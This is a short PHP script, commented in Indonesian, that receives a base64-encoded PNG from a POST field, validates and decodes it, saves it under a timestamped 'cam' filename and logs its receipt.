<?php
// Validasi input
if (empty($_POST['cat'])) {
    http_response_code(400);
    exit('No image data received');
}

$imageData = $_POST['cat'];

// Pastikan format base64 valid
if (!preg_match('/^data:image\/png;base64,/', $imageData)) {
    http_response_code(400);
    exit('Invalid image format');
}

// Ekstrak data base64
$filteredData = substr($imageData, strpos($imageData, ',') + 1);
$binary = base64_decode($filteredData, true); // mode strict

if ($binary === false) {
    http_response_code(400);
    exit('Base64 decode failed');
}

// Generate nama file unik
$date = date('dMYHis');
$filename = "cam{$date}.png";

// Simpan file
if (file_put_contents($filename, $binary) !== false) {
    // Buat log bahwa foto diterima
    error_log("Received\n", 3, "Log.log");
    echo json_encode(['status' => 'success']);
} else {
    http_response_code(500);
    exit('Failed to save image');
}

exit();
?>